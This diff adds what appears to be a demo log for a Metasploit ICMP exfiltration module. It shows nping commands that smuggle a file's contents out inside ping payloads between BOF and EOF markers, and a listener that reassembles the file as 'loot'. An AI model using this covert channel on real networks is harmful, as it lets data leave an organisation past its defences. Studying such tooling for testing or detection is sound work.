@@ -1,0 +1,80 @@
+============
+== Client ==
+============
+
+> nping --icmp 10.0.0.138 --data-string "BOF:test.txt" -c1
+
+Starting Nping 0.5.61TEST5 ( http://nmap.org/nping ) at 2012-04-04 15:05 W. Europe Daylight Time
+SENT (0.5860s) ICMP 10.0.0.148 > 10.0.0.138 Echo request (type=8/code=0) ttl=64 id=42953 iplen=40
+RCVD (1.0580s) ICMP 10.0.0.138 > 10.0.0.148 Echo reply (type=0/code=0) ttl=32 id=3551 iplen=33
+
+Max rtt: 13.000ms | Min rtt: 13.000ms | Avg rtt: 13.000ms
+Raw packets sent: 1 (54B) | Rcvd: 1 (33B) | Lost: 0 (0.00%)
+Tx time: 0.46000s | Tx bytes/s: 117.39 | Tx pkts/s: 2.17
+Rx time: 1.46000s | Rx bytes/s: 22.60 | Rx pkts/s: 0.68
+Nping done: 1 IP address pinged in 2.05 seconds
+
+> nping --icmp 10.0.0.138 --data-string "test text...." -c1
+
+Starting Nping 0.5.61TEST5 ( http://nmap.org/nping ) at 2012-04-04 15:05 W. Europe Daylight Time
+SENT (0.6230s) ICMP 10.0.0.148 > 10.0.0.138 Echo request (type=8/code=0) ttl=64 id=38228 iplen=41
+RCVD (1.0540s) ICMP 10.0.0.138 > 10.0.0.148 Echo reply (type=0/code=0) ttl=32 id=14168 iplen=33
+
+Max rtt: 10.000ms | Min rtt: 10.000ms | Avg rtt: 10.000ms
+Raw packets sent: 1 (55B) | Rcvd: 1 (33B) | Lost: 0 (0.00%)
+Tx time: 0.42200s | Tx bytes/s: 130.33 | Tx pkts/s: 2.37
+Rx time: 1.42200s | Rx bytes/s: 23.21 | Rx pkts/s: 0.70
+Nping done: 1 IP address pinged in 2.04 seconds
+
+> nping --icmp 10.0.0.138 --data-string " test text.... again" -c1
+
+Starting Nping 0.5.61TEST5 ( http://nmap.org/nping ) at 2012-04-04 15:05 W. Europe Daylight Time
+SENT (0.6260s) ICMP 10.0.0.148 > 10.0.0.138 Echo request (type=8/code=0) ttl=64 id=12163 iplen=48
+RCVD (1.0580s) ICMP 10.0.0.138 > 10.0.0.148 Echo reply (type=0/code=0) ttl=32 id=60632 iplen=33
+
+Max rtt: 12.000ms | Min rtt: 12.000ms | Avg rtt: 12.000ms
+Raw packets sent: 1 (62B) | Rcvd: 1 (33B) | Lost: 0 (0.00%)
+Tx time: 0.42100s | Tx bytes/s: 147.27 | Tx pkts/s: 2.38
+Rx time: 1.42200s | Rx bytes/s: 23.21 | Rx pkts/s: 0.70
+Nping done: 1 IP address pinged in 2.05 seconds
+
+> nping --icmp 10.0.0.138 --data-string "EOF" -c1
+
+Starting Nping 0.5.61TEST5 ( http://nmap.org/nping ) at 2012-04-04 15:06 W. Europe Daylight Time
+SENT (0.6420s) ICMP 10.0.0.148 > 10.0.0.138 Echo request (type=8/code=0) ttl=64 id=30459 iplen=31
+RCVD (1.0970s) ICMP 10.0.0.138 > 10.0.0.148 Echo reply (type=0/code=0) ttl=32 id=55188 iplen=33
+
+Max rtt: 24.000ms | Min rtt: 24.000ms | Avg rtt: 24.000ms
+Raw packets sent: 1 (45B) | Rcvd: 1 (33B) | Lost: 0 (0.00%)
+Tx time: 0.43100s | Tx bytes/s: 104.41 | Tx pkts/s: 2.32
+Rx time: 1.43100s | Rx bytes/s: 23.06 | Rx pkts/s: 0.70
+Nping done: 1 IP address pinged in 2.07 seconds
+
+
+============
+== SERVER ==
+============
+
+msf  auxiliary(icmp_exfil) > rerun
+[*] Reloading module...
+
+[+] ICMP Listener started on eth0 (10.0.0.138). Monitoring for trigger packet containing ^BOF:
+[*] 2012-04-04 15:05:31 +0200: SRC:10.0.0.148 ICMP (type 8 code 0) DST:10.0.0.138
+[+] Beginning capture of test.txt data
+[*] Received 18 bytes of data from 10.0.0.148
+[*] Received 20 bytes of data from 10.0.0.148
+[*] 38 bytes of data recevied in total
+[+] End of File received. Saving test.txt to loot
+[+] Incoming file test.txt saved to loot
+[+] Loot filename: /root/.msf4/loot/20120404150603_default_10.0.0.138_icmp_exfil_340768.txt
+[*] Stopping ICMP listener on eth0 (10.0.0.138)
+[-] Auxiliary interrupted by the console user
+[*] Auxiliary module execution completed
+msf  auxiliary(icmp_exfil) > loot
+
+Loot
+====
+
+host        service  type        name      content   info                    path
+----        -------  ----        ----      -------   ----                    ----
+10.0.0.138           icmp_exfil  test.txt  text/xml  ICMP Exfiltrated Data   /root/.msf4/loot/20120404150603_default_10.0.0.138_icmp_exfil_340768.txt
